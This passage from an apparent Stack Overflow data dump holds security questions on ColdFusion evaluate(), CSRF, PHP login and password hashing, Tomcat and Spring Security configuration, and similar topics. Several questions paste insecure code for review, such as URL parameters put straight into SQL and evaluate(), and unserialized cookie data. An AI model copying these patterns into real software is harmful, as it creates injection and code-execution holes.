to one track already hosted on SoundCloud without the possibility to download it. So people that download the player client can only listen to this track?</p>\n"},{"tags":["security","coldfusion","coldfusion-9","evaluate"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":119,"score":1,"question_id":12858136,"title":"Alternatives to Evaluate","body":"<p>An audit has shown up a vulnerability in our use of evaluate as it allows arbitrary code execution. Has anyone got an alternative? Example below. We're running CF9.</p>\n\n<pre><code>&lt;cfquery name=\"getvalue\" datasource=\"#application.ds#\"&gt;\n   SELECT     #url.column#\n   FROM         dbo.tbl#url.table#\n   WHERE     (int#url.table#Id = &lt;CFQUERYPARAM Value=\"#url.Id#\"&gt;)\n&lt;/cfquery&gt;\n\n&lt;cfif url.rowtype eq \"text\"&gt;\n    &lt;cfoutput&gt;\n    &lt;input type=\"text\" id=\"focus#url.table##url.column##url.Id#\" \n        name=\"#url.table##url.column##url.Id#\" \n        value=\"#evaluate('getvalue.#url.column#')#\" \n        class=\"inputtext\"\n        onblur=\"updateeditvalue('#url.rowtype#','#url.table#','#url.column#',#url.Id#\n                    ,escape(this.form.#url.table##url.column##url.Id#.value))\" \n        style=\"height:20px;width:500px;\"&gt;\n    &lt;/cfoutput&gt;\n&lt;cfelseif url.rowtype eq \"textarea\"&gt;\n     &lt;cfoutput&gt;\n     &lt;textarea id=\"focus#url.table##url.column##url.Id#\" \n        name=\"#url.table##url.column##url.Id#\" \n        class=\"inputtext\" style=\"height:20px;width:500px;\"\n        onblur=\"updateeditvalue('#url.rowtype#','#url.table#','#url.column#',#url.Id#\n                     , escape(this.form.#url.table##url.column##url.Id#.value))\"&gt;\n          #evaluate('getvalue.#url.column#')#\n    &lt;/textarea&gt;\n    &lt;/cfoutput&gt;\n&lt;/cfif&gt;\n</code></pre>\n"},{"tags":["java","security","java-ee-6","jboss7.x"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":47,"score":0,"question_id":12862549,"title":"How can I secure a webapp with basic authentication in specific jboss environment?","body":"<p>I have a webapp (war) and it should run in different environments (local, dev, etc...). The DEV environment is internet accessible.</p>\n\n<p>How can I protect access in this environment? I sould not change the WAR file for different environments. A basic authentication with users &amp; passwords in a textfile is enough. </p>\n\n<p>(The Webapp runs in JBoss AS 7.)</p>\n"},{"tags":["ajax","web-services","security","csrf"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12843496,"title":"Protect Web API from unauthorized applications","body":"<p>I am working on a web page that uses a lot of AJAX to communicate with the server. The server, in turn, has an extensive REST/JSON API exposing the different operations called by the web client.</p>\n\n<p>This web site is used by both anonymous and authenticated users. As you might expect, the web service calls issued by authenticated users require authentication, and are thus protected from unauthorized users or applications.</p>\n\n<p>However, the web site has a lot of features that require no authentication, and some of these make use of anonymous web services. The only way I am using to prevent outsiders from calling this web services is by using a <a href=\"http://en.wikipedia.org/wiki/Cross-site_request_forgery#Prevention\" rel=\"nofollow\">CSRF token</a>. I know, the CSRF token is not very useful in this regard... with some time in hand, you can figure out how to consume the web services even if they use a CSRF token.</p>\n\n<p>Of course, you can use a CAPTCHA to prevent applications or bots from autonomously using your web service. However, any human will be able to use it.</p>\n\n<p>Sharing a secret key between client and server, on the other side, would be useless. This, because of the ability of any outsider to read it from the web page source code.</p>\n\n<p><strong>I would like to make these web services as difficult to invoke as posible to any 3rd party application</strong>. What would you do besides using the CSRF token? It sounds a little stupid, but hey, maybe it is stupid and I am just losing my time.</p>\n\n<p><em>Note: given this application uses a browser and not an \"executable\" as the client, <a href=\"http://stackoverflow.com/questions/2066107/web-api-security\">this question</a> is irrelevant to the discussion. I cannot use a secret between server and client (not to my knowledge, at least)</em></p>\n"},{"tags":["php","javascript","security"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12861419,"title":"Securing javascript game timing","body":"<p>I'm creating a canvas-based game that has an important timing element to it. Upon completion of the game, the user's completion time is to be sent to PHP/MySQL on the server for comparison with other players. </p>\n\n<p>Server-side timing (i.e. begin request time to submit request time) seems like it could introduce load times as affecting the user's actual time and therefore inefficient in this case. </p>\n\n<p>What I'm having trouble with is determining a way to assure that the time sent is legitimate. How can I stop someone from using their console and editing the client-side code in such a way as to submit a false time?</p>\n\n<p>Any help would be greatly appreciated.</p>\n"},{"tags":["asp.net","sql-server","security","permissions"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12856937,"title":"Efficient Granular SecurityPermissions or (ACL)","body":"<p>we are looking into ripping out a inefficient architecture for defining security in our asp.net 4 webforms intranet. </p>\n\n<p>Our application allows definition of Permissions content and content areas. Things like Fred Bloggs has permission to edit documentb which lives in The folder(section) Sales. With the Resultant permission for Fred Bloggs being built up from the groups he belongs to and any specific permissions he has been granted or revoked from on that document or folder etc.</p>\n\n<p>Are there any nuget packages or resources out there which define the most efficient pattern for implementing Access Control Lists</p>\n\n<p>Cheers\nTim</p>\n"},{"tags":["android","security","android-resources"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":105,"score":2,"question_id":12465328,"title":"Where to store sensitive global information such as API keys in Android application?","body":"<p>I need to store some sensitive information in an Android application.  If I put it in a resource file, it appears that it is trivial for another app to be able to browse and read that file simply by using <a href=\"http://developer.android.com/reference/android/content/pm/PackageManager.html#getResourcesForApplication%28java.lang.String%29\" rel=\"nofollow\">PackageManager.getResourcesForApplication()</a>.</p>\n\n<p>Where is the correct place to put information like this that we don't want people to be able to easily snoop?</p>\n\n<p>Should it be in a compiled java file?  Or are classfiles also easily readable?  Also, if they're in java files, is it possible to reference them from XML files that need them (eg. for the google maps api key)?</p>\n"},{"tags":["php","mysql","security"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":404,"score":2,"question_id":8388536,"title":"Storing password in database and making admin panel secure","body":"<p>I am working on a website which is having Admin panel along with the website. </p>\n\n<p>Website Root Folder: <code>/htdocs</code></p>\n\n<p>Other public content of the website is in <code>/htdocs</code> folder only.</p>\n\n<p>Admin website folder: <code>/htdocs/admin</code></p>\n\n<p><strong>My Question:</strong> What are the things I need to do to make sure that my admin panel (or website) is secure from attacks?</p>\n\n<p>These are the things I am doing:</p>\n\n<ol>\n<li>Every file in <code>/htdocs/admin</code> folder is set as permission: 444\n(<code>r--r--r--</code>) of Linux.</li>\n<li><code>adminLogin.php</code> file in admin folder is using POST method to send\nthe credentials to the <code>validateCredentials.php</code> which will direct\nto <code>adminHome.php</code> upon correct username and password. The following session variable is set (along with others) on a successful login: <code>$_SESSION['usertype'] = \"admin\";</code></li>\n<li>All other files in admin folder have a check at the top of the file\nfor a valid admin SESSION variable. If there is no session variable,\nthen page will redirect to adminLogin.php</li>\n<li>Password of administrator is stored as a MD5 hash in\n<code>admin_login_details</code> table. This table is in the same database as the whole\nof the site. I got <a href=\"http://stackoverflow.com/q/1054022/722531\">this</a> question to make password storing even more secure.</li>\n<li>While verifying the password from the <code>admin_login_details</code> table, the entered\npassword is first passed to mysql_real_escape_string() and then used -- to\nprevent SQL Injection.</li>\n</ol>\n\n<p>What else is needed? Are the above points correct? If there anything which is potential security concern? </p>\n\n<p>Please add more points if required. </p>\n\n<p>I am using PHP, MySQL, Apache on CentOS server. </p>\n"},{"tags":["java","security","logging","fortify360"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":129,"score":2,"question_id":12784707,"title":"log forging fortify fix","body":"<p>I am using Fortify SCA to find the security issues in my application (as a university homework). I have encountered some 'Log Forging' issues which I am not able to get rid off.</p>\n\n<p>Basically, I log some values that come as user input from a web interface:</p>\n\n<pre><code>logger.warn(\"current id not valid - \" + bean.getRecordId()));\n</code></pre>\n\n<p>and Fortify reports this as a log forging issue, because the <em>getRecordId()</em> returns an user input.</p>\n\n<p>I have followed this <a href=\"http://www.jtmelton.com/2010/09/21/preventing-log-forging-in-java/\" rel=\"nofollow\">article</a>, and I am replacing the 'new line' with space, but the issue is still reported</p>\n\n<pre><code>logger.warn(\"current id not valid - \" + Util.replaceNewLine(bean.getRecordId()));\n</code></pre>\n\n<p>Can anyone suggest a way to fix this issue?</p>\n"},{"tags":["javascript","jquery","security","xss"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12831002,"title":"XSS - Send data to the source server of a script?","body":"<p>I am writing a JavaScript application where I plan on host the code on a CDN.  Now I plan to include this code to my clients' sites. However, I have a problem, I want to use AJAX to communicate between the client and the server.  Now, from my understanding of XSS, this is not possible.</p>\n\n<p>Ex:</p>\n\n<ol>\n<li>User visits site.com, where a script tag's source is pointing to a file on cdn.somedomain.com</li>\n<li>The script on cdn.somedomain.com fires an event.</li>\n<li>This event will communicate with a PHP.  I know it is possible for the script from cdn.somedomain.com to request documents on site.com.  However, is it possible to send data back to a PHP file on cdn.somedomain.com?</li>\n</ol>\n\n<p>Thanks for helping an entrepenuer! :D</p>\n"},{"tags":["php","ajax","security","authentication","login"],"answer_count":13,"favorite_count":5,"up_vote_count":9,"down_vote_count":0,"view_count":3477,"score":9,"question_id":1145132,"title":"How safe is it to send a plain text password using AJAX?","body":"<p>Maybe the title is badly phrased but couldn't think of a better way of saying it.</p>\n\n<p>I am working on a login system at the moment (nothing formal, just experimenting) and was planning on using PHPLiveX (an AJAX library) for some features. Basically you create some PHP functions which are then called via JavaScript. You can add parameters (getElementById) to the javascript that are transfered to the PHP function.</p>\n\n<p>What i really wanted to know is whether it is safe to just call the function from javascript without encrypting the password first, then letting the PHP function encrypt it (SHA256 in this case). Can the data transfered via AJAX be intercepted? If so how likely is this?</p>\n\n<p>Thanks</p>\n"},{"tags":["security","postgresql","sqlalchemy"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12850295,"title":"How to double quote escape in SQLAlchemy","body":"<p>I wish to safely pass a schema name that must be double-quote escaped to the database engine, in this case when constructing a GRANT statement I want to pass a variable containing test safely to the database.</p>\n\n<pre><code>GRANT SELECT ON ALL TABLES IN SCHEMA \"test\" TO readuser\n</code></pre>\n\n<p>I'm unsure how to do this from SQLAlchemy. </p>\n\n<p>If it helps I am using psycopg2 to connect to postgreSQL</p>\n"},{"tags":["java","security","tomcat","realm"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2869,"score":0,"question_id":4400645,"title":"Configuring a Context specific Tomcat Security Realm","body":"<p>I am trying to get a context specific security Realm in Tomcat 6.0, but when I start Tomcat I get the following error:</p>\n\n<pre><code>09-Dec-2010 16:12:40 org.apache.catalina.startup.ContextConfig validateSecurityRoles\nINFO: WARNING: Security role name myrole used in an &lt;auth-constraint&gt; without being defined in a &lt;security-role&gt;\n</code></pre>\n\n<p>I have created the following context.xml file:</p>\n\n<pre><code>&lt;Context debug=\"0\" reloadable=\"true\"&gt;\n\n  &lt;Resource name=\"MyUserDatabase\"\n            type=\"org.apache.catalina.UserDatabase\"\n            description=\"User database that can be updated and saved\"\n            factory=\"org.apache.catalina.users.MemoryUserDatabaseFactory\"\n            pathname=\"conf/my-users.xml\" /&gt;\n\n  &lt;Realm className=\"org.apache.catalina.realm.UserDatabaseRealm\"\n         resourceName=\"MyUserDatabase\"/&gt;\n\n&lt;/Context&gt;\n</code></pre>\n\n<p>Created a file: my-users.xml which I have placed under WEB-INF/conf which contains the following:</p>\n\n<pre><code>&lt;tomcat-users&gt;\n  &lt;role rolename=\"myrole\"/&gt;\n  &lt;user username=\"test\" password=\"changeit\" roles=\"myrole\" /&gt;\n&lt;/tomcat-users&gt;\n</code></pre>\n\n<p>Added the following lines to my web.xml file:</p>\n\n<pre><code>&lt;web-app ...&gt;\n  ...\n  &lt;security-constraint&gt;\n    &lt;web-resource-collection&gt;\n      &lt;web-resource-name&gt;Entire Application&lt;/web-resource-name&gt;\n      &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n    &lt;/web-resource-collection&gt; \n    &lt;auth-constraint&gt;\n      &lt;role-name&gt;myrole&lt;/role-name&gt;\n    &lt;/auth-constraint&gt;\n  &lt;/security-constraint&gt;\n\n  &lt;login-config&gt;\n    &lt;auth-method&gt;BASIC&lt;/auth-method&gt;\n  &lt;/login-config&gt;\n  ...\n&lt;/web-app&gt;\n</code></pre>\n\n<p>But seem to get the error wherever I put conf/my-users.xml.  Do I have to specify an explicit PATH in the pathname or is it relative to somewhere?  Ideally I would like to have it packaged up as part of my WAR file.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["security","cookies","subdomain","xss","hacking"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12847920,"title":"Security risks of giving full access to a subdomain's content","body":"<p>There are many hosted/saas applications that give you full control over the content of your subdomain.</p>\n\n<p>So if the saas application is called example.com, when you signup you get full control of your site like:</p>\n\n<pre><code>my-website.example.com\n</code></pre>\n\n<p>You also login to edit the content at:</p>\n\n<pre><code>my-website.example.com/admin/\n</code></pre>\n\n<p>Seeing as there are 1000's of other customers, what security threads does this type of setup involve?</p>\n\n<p>What can be done to mitigate these security threats? </p>\n"},{"tags":["security","cryptography","x509certificate","public-key-encryption","publickey"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":128,"score":2,"question_id":6505204,"title":"If public key of two files are same, is it sufficient to conclude that they were signed by the same certificate?","body":"<p>I am implementing an auto-update mechanism for my software. The msi on the server is signed using signtool. My app downloads the msi and reads the public key of the downloaded msi. If the public key matches the one that is hard coded in the source code, it will execute the msi and update itself. </p>\n\n<p>Would this is be sufficient to ensure that no malicious msi gets executed by mistake? My understanding is that a file will have the same public key ONLY if signed by my certificate. </p>\n\n<p><strong>Edit:</strong>\nWith petey's help, I was able to detect if the msi was signed by my certificate or not. However, this didnt quite solve my problem. I can still edit the signed msi using a tool like Orca. Even the msi is no longer the same as the one that was signed, nothing happens to certificate. So when I check whether the msi is signed by me, I get yes. While I understand that this might be intended behaviour, but <strong>there must be some way to detect if the msi was tampered with??</strong></p>\n"},{"tags":["database","security","delete","record"],"answer_count":8,"favorite_count":1,"up_vote_count":12,"down_vote_count":0,"view_count":5379,"score":12,"question_id":378331,"title":"Physical or Logical Delete of Database Record","body":"<p>What is the advantage of doing a logical delete of a record (i.e. setting a flag stating that the record is deleted) as opposed to actually or physically deleting the record?</p>\n\n<p>Is this common practice?</p>\n\n<p>Is this secure?</p>\n"},{"tags":["wcf","security","http","username"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12828295,"title":"WCF custom userName authentication using HTTP","body":"<p>I am trying to configure my WCF service to use a custom username validator over HTTP and my ASP.NET Development server.   Following are the parts of the serviceModel...</p>\n\n<pre><code>&lt;basicHttpBinding&gt;\n    &lt;binding name=\"Authentication\" &gt;\n      &lt;security mode=\"TransportCredentialOnly\" &gt;\n        &lt;message clientCredentialType=\"UserName\"/&gt;\n      &lt;/security&gt;\n    &lt;/binding&gt;\n&lt;/basicHttpBinding&gt;\n\n  &lt;service behaviorConfiguration=\"ApiBehavior\" name=\"CriticalWatch.AuthenticationAPI.AuthenticationAPI\"&gt;\n    &lt;endpoint address=\"/\" binding=\"basicHttpBinding\" bindingConfiguration=\"AuthenticationBinding\" name=\"Authentication\" contract=\"CriticalWatch.AuthenticationAPI.IAuthenticationAPI\" /&gt;\n  &lt;/service&gt;\n</code></pre>\n\n<p>I then have a behavior for the validator...</p>\n\n<pre><code>  &lt;serviceBehaviors&gt;\n    &lt;behavior name=\"ApiBehavior\"&gt;\n      &lt;serviceMetadata httpGetEnabled=\"true\" /&gt;\n      &lt;serviceDebug includeExceptionDetailInFaults=\"true\" /&gt;\n      &lt;serviceCredentials&gt;\n        &lt;userNameAuthentication userNamePasswordValidationMode=\"Custom\" customUserNamePasswordValidatorType=\"Service.CustomUserNameValidator, MyService\" /&gt;\n      &lt;/serviceCredentials&gt;\n\n    &lt;/behavior&gt;\n  &lt;/serviceBehaviors&gt;\n</code></pre>\n\n<p>My CustomUserNameValidator inherits from the  UserNamePasswordValidator.  The validator class gets instantiated,  but the Validate method is never called.  Plus, the client can call the method without passing any username and password.</p>\n\n<p>What am I missing?</p>\n\n<p>At this time, I want a solution that does not require HTTPS.   I want to rely on the username and password passed with the message.</p>\n"},{"tags":["database","sql-server-2008","security","encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":64,"score":3,"question_id":12840665,"title":"Securing a SQL Server database on a server administered /controlled by third party admins","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4552376/is-it-possible-to-password-protect-an-sql-server-database-even-from-administrato\">Is it possible to password protect an SQL server database even from administrators of the server?</a>  </p>\n</blockquote>\n\n\n\n<p>I am hosting my database on SQL Server 2008 on a windows 7 machine. The Windows 7 machine and the SQL Server 2008 are controlled and administered by third party admins. </p>\n\n<p>I have sensitive information in my database. </p>\n\n<p>How do I secure my database, so that the third party admins do not look at the sensitive data?</p>\n\n<p>Is there any way to restrict the third party admins from copying the stored procedures, table designs etc.</p>\n"},{"tags":["php","arrays","security","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":106,"score":1,"question_id":12006725,"title":"Is it safe to store an array in a cookie?","body":"<p>I have a script which takes arrays to shuffle them and then stores them into a cookie, so that user will have shuffled array only once.</p>\n\n<p>Here's the script:</p>\n\n<pre><code>$shufflecookie = $_COOKIE['shuffle'];\n              \nif (isset($_COOKIE['shuffle'])) {\n $items = unserialize(gzuncompress(base64_decode($shufflecookie)));\n}\nelse {\n shuffle($items);\n $items_serialized = base64_encode(gzcompress(serialize($items)));\n setcookie(\"shuffle\", $items_serialized, 0, \"/\");\n}\n</code></pre>\n\n<p>Is it safe to do that? or maybe there's better way of storing this data? Thanks</p>\n\n<p>UPD. Thanks for helping. What I did is just replaced cookie with session. So new code is:</p>\n\n<pre><code>$shufflecookie = $_SESSION[\"shuffle\"];\n              \nif (isset($_SESSION[\"shuffle\"])) {\n $items = unserialize(gzuncompress(base64_decode($shufflecookie)));\n}\nelse {\n shuffle($items);\n $items_serialized = base64_encode(gzcompress(serialize($items)));\n $_SESSION[\"shuffle\"] = $items_serialized;\n}\n</code></pre>\n"},{"tags":["php","security","obfuscation","zend-guard"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12017164,"title":"Protecting code using Zend Guard","body":"<p>I'd like to protect a PHP app that a client wants to have hosted on their own servers - I know that Zend Guard &amp; Ion Cube do some form of protection but i've also found sites that will reverse engineer this code.</p>\n\n<p>My question is - is there a way to obfuscate the code first, then load it through the Zend Guard to give it a 'second layer' of protection.</p>\n\n<p>Apart from the slowdown of performance of this site what other pros &amp; cons could I expect if this is even at all possible?</p>\n"},{"tags":["security","java-ee","tomcat","tomcat6","access-control"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1677,"score":2,"question_id":10498237,"title":"How can I restrict access to certain URLs by source IP in Tomcat?","body":"<p>I want to restrict access to certain URLs in my Tomcat webapp. \nOnly 3 known IP addresses should be allowed access to URLs that fit a certain pattern.</p>\n\n<p>e.g. <code>http://example.com:1234/abc/personId</code></p>\n\n<p>How can I achieve this?</p>\n"},{"tags":["php","security","hash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12844322,"title":"Trying To Understand PHP password_hash","body":"<p>I'm trying to learn more about PHP security best practices, and I came across password_hash and the <a href=\"https://github.com/ircmaxell/password_compat\" rel=\"nofollow\">password_compat</a> project by Anthony Ferrara.  I think I understand how to implement it, but in testing, I came across a curious behavior that contradicts my novice understanding of password hashing.</p>\n\n<p>If I save the result of the password_hash function into a MySQL database user record and then retrieve that hash for verification using password_verify, it works as expected.  However, if I do the exact same thing, but rather than pull from the database, I just hard-code the password hash via a copy/paste from the database, the password_verify function fails.</p>\n\n<p>The code is below:</p>\n\n<pre><code>// Get the Username and password hash from the MySQL database.  GetPassTestuser routine returns an array where\n//   position[0][0] is the username and position[0][1] is the password hash.\n$arrUser = GetPassTestuser(\"mike24\");\necho(\"User Name: \".$arrUser[0][0].\"&lt;br/&gt;\");\necho(\"Password hash: \".$arrUser[0][1].\"&lt;br/&gt;\");\n\n// Run password_verify with the password hash collected from the database.  Compare it with the string \"mytest\"\n//  (This returns true in my tests).\nif (password_verify(\"mytest\",$arrUser[0][1])){\n    echo(\"Password verified\");\n} else {\n    echo(\"Password invalid\");\n}\necho(\"&lt;hr&gt;Now On to our second test...&lt;br/&gt;\");\n// Now run password_verify with a string representation directly copied/pasted from the database.  This is \n//   being compared with \"mytest\", which in my mind should return a true value.  But it doesn't and this test\n//   fails.  Not sure why.\nif (password_verify(\"mytest\",\"$2y$10$S33h20qxHndErOoxJL.sceQtBQXtSWrHieBtFv59jwVwJuGeWwKgm\")){  // String shown here is the same as value contained in $arrUser[0][1]\n    echo(\"2nd Test Password verified\");\n} else {\n    echo(\"2nd test Password invalid\");\n}\n</code></pre>\n\n<p>While this isn't something I'd do in real code, I'm just trying to understand what the difference is.  Why does it work OK when I use the string variable that supposedly contains the exact same hash, but doesn't work when it's hard coded?</p>\n\n<p>Thanks!</p>\n"},{"tags":["security","wsdl","spring-ws"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12843436,"title":"Spring-WS 2, how to include ws-policies in auto generated wsdl?","body":"<p>I have to add security to web services implemented using spring-WS. I added the security using apache API and everything is working as expected when test it with SoapUI. I noticed that my security policies are not included in the auto generated wsdl. I searched and haven't found any solution.</p>\n\n<p>Anyone knows how to include the policies into the wsdl?</p>\n"},{"tags":["php","security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":65,"score":1,"question_id":12843314,"title":"What is best way to save user's data to carry through the website pages in PHP?","body":"<p>What is the best way to carry users data through the pages(php)? Currently, I use sessions to hold and use data like username, lastlogin, password, purchased items and ... between the website pages.</p>\n\n<p>Would saving these data in sessions decrease security of website? Is there another way(s) to carry these data?</p>\n"},{"tags":["security","chat"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":605,"score":0,"question_id":4574411,"title":"Chat program without a central server","body":"<p>Happy new year to all of you!</p>\n\n<p>I'm developing a chat application (in VB.Net).</p>\n\n<p>It will be a secure chat program.</p>\n\n<p>All traffic will be encrypted (I also need to find the best approach for this, but that's not the question for now).</p>\n\n<p>Currently the program works. I have a server application and a client application.</p>\n\n<p>However I want to setup the application so that it doesn't need a central server for it to work.</p>\n\n<p>What would be the best approach for this case.</p>\n\n<p>I think I need to develop the clients in a way so that they do also act as a server.</p>\n\n<p>How would the clients know what server it needs to connect with / what happens if a server is down? How would the clients / servers now what other nodes there are in the network without having a central server?</p>\n\n<p>At best I don't want the clients to know what the IP addresses are of the different nodes, however I don't think this would be possible without having a central server.</p>\n\n<p>As stated the application will be written in VB.Net, but I think the language doesn't really matter at this point.</p>\n\n<p>Just want to know the different approaches I can follow.</p>\n"},{"tags":["mysql","security","pdo","user-input"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":27,"score":2,"question_id":12842822,"title":"PHP PDO clean user input","body":"<p>I've been looking into the most efficient method of cleaning user input. My application is a simple post request that is used to authenticate a user. Looking online I can find more then a dozen different \"best\" methods of doing this. A lot of these methods use deprecated php functions or seem overly complicated. In order to connect to my sql database I use the PDO class. </p>\n\n<p>While searching for my own functions I stumbled accross this:</p>\n\n<blockquote>\n  <p>Prepared statements with bound parameters are not only more portable, more convenient, immune to SQL injection, but are often much faster to execute than interpolated queries, as both the server and client side can cache a compiled form of the query.</p>\n</blockquote>\n\n<p>I already use the prepare method to create my statement. Does this mean I'm safe against SQL injection attacks? What else should I be worried about? </p>\n"},{"tags":["iphone","security","ios","video","drm"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":693,"score":2,"question_id":5548981,"title":"iOS: encrypt / decrypt video file","body":"<p>We are in the process of talking about how to set up an online video rental store. Besides streaming we would love it if the user would be able to download a movie first, which is then stored for a certain amount of time on the device itself, in this scenario an iOS-device.</p>\n\n<p>But how can we achieve this and keep it save? Obviously we don't want the user to be able to simply copy the file from the filesystem which is a pretty easy task once the device is jailbroken.</p>\n\n<p>So there is the need to store the file encrypted or with some sort of DRM. But even then: How to make sure that the user can't decrypt it himself? And once playback is started how can we achieve that we don't decrypt the whole file (which would be too big to store it in the memory) so that the user doesn't get access it.</p>\n\n<p>Any ideas / solutions?</p>\n"},{"tags":["java","spring","security","getmethod"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":106,"score":1,"question_id":12838607,"title":"Spring Security access to a request, without pre-authentication, from remote access","body":"<p>I wrote here because I cannot find a clear answer to my problem:</p>\n\n<p>My project is using Spring MVC and Spring Security. I well installed both for a web application (of course using Java). I can access with post and get method, but only after the user has been connected via the usual form of Spring Security.</p>\n\n<p>From now, the user do a request on an address like this: </p>\n\n<p><code>../../get.request?request=getListCommand</code></p>\n\n<p>where get.request is a mapping from Spring MVC. This access is enable only after the user has been authenticated!</p>\n\n<p><strong>What I need to do:</strong> <em><strong>Add</em></strong> the possibility to access directly to this request, without has been authenticated previously, using an address like this one for example:</p>\n\n<p><code>http://123.123.123.123:123/get.request?request=getListCommand&amp;j_password=myPassword&amp;j_username=myName</code> </p>\n\n<p>or</p>\n\n<p><code>same thing with the post protocol and the params given (request=getListCommand, j_password=myPassword, j_username=myName)</code></p>\n\n<p>Of course the authentication will have to be done previously the request is performed and the result sent back.</p>\n\n<p>I searched on many website or directly on the Spring security website. They talk about filterchaining, own user name authentication, RMI; but I don't really found a full example doing what I presented above.</p>\n\n<p>Thanks for anyone than can help me that way.</p>\n\n<p>ps: I use all default or the most simple configuration for Spring security (no fengshui' style :-))</p>\n\n<p>Here is my securit context xml file</p>\n\n<pre><code>&lt;http realm=\"NexCap Up\"\n        auto-config=\"true\"\n        access-denied-page=\"/www/jsp/authentication/accessDenied.jsp\"\n        create-session=\"always\"\n        disable-url-rewriting=\"true\"&gt;          \n            &lt;port-mappings&gt;\n                &lt;port-mapping http=\"8084\" https=\"8443\"/&gt;\n            &lt;/port-mappings&gt;        \n\n            &lt;intercept-url pattern=\"/www/jsp/authentication/connexion.jsp\"                    \n                access='IS_AUTHENTICATED_ANONYMOUSLY' requires-channel=\"https\"/&gt;\n\n            &lt;intercept-url pattern=\"/www/jsp/authentication/connexionFailed.jsp\" \n                access='IS_AUTHENTICATED_ANONYMOUSLY'  /&gt;\n\n            &lt;intercept-url pattern=\"/www/jsp/authentication/applicationExit.jsp\" \n                access='IS_AUTHENTICATED_ANONYMOUSLY'  /&gt; \n\n\n          &lt;intercept-url \n                pattern=\"/get.Request\" \n                method=\"GET\"\n                access=\"ROLE_REMOTE\" /&gt;\n\n             &lt;intercept-url \n                pattern=\"/post.Request\"  \n                method=\"POST\"\n                access=\"ROLE_REMOTE\" /&gt;\n\n            &lt;intercept-url pattern=\"/**\" \n                access=\"ROLE_REMOTE,ROLE_SCRIPT\"  /&gt;\n       &lt;form-login \n            authentication-failure-url=\"/www/jsp/authentication/connexionFailed.jsp\"\n            login-page=\"/www/jsp/authentication/connexion.jsp\"\n            default-target-url=\"/www/jsp/index.jsp\"\n            always-use-default-target=\"true\"/&gt;\n\n        &lt;logout\n            logout-success-url=\"/www/jsp/authentication/applicationExit.jsp\"\n            invalidate-session=\"true\"/&gt;\n\n        &lt;session-management\n            invalid-session-url=\"/www/jsp/authentication/invalidSession.jsp\"\n            session-authentication-error-url = \"/www/jsp/authentication/authentificationError.jsp\"\n            session-fixation-protection=\"none\"&gt;\n\n            &lt;!-- Sessions concurrentes --&gt;\n            &lt;concurrency-control \n                error-if-maximum-exceeded=\"false\"\n                expired-url=\"/www/jsp/authentication/sessionExpired.jsp\"\n                max-sessions=\"1\" /&gt;\n\n        &lt;/session-management&gt;\n\n    &lt;/http&gt;\n</code></pre>\n\n<p>And the part of the web.xml file about the spring security</p>\n\n<pre><code>&lt;security-constraint&gt;\n    &lt;web-resource-collection&gt;\n        &lt;web-resource-name&gt;Security&lt;/web-resource-name&gt;\n        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n    &lt;/web-resource-collection&gt;\n    &lt;user-data-constraint&gt;\n        &lt;transport-guarantee&gt;CONFIDENTIAL&lt;/transport-guarantee&gt;\n    &lt;/user-data-constraint&gt;\n&lt;/security-constraint&gt;\n\n\n&lt;filter&gt;\n  &lt;display-name&gt;springSecurityFilterChain&lt;/display-name&gt;\n  &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n  &lt;filter-class&gt;\n      org.springframework.web.filter.DelegatingFilterProxy\n  &lt;/filter-class&gt;\n</code></pre>\n\n<p></p>\n\n<pre><code>&lt;filter-mapping&gt;\n   &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n   &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n</code></pre>\n\n<p></p>\n\n<pre><code>&lt;context-param&gt;\n   &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n   &lt;param-value&gt;\n       /WEB-INF/spring/secu-config.xml\n   &lt;/param-value&gt;\n</code></pre>\n\n<p></p>\n"},{"tags":["windows","security","process","windows-sdk"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":133,"score":1,"question_id":2384022,"title":"WINSDK: Determining whether an arbitrary pid identifies a running process on 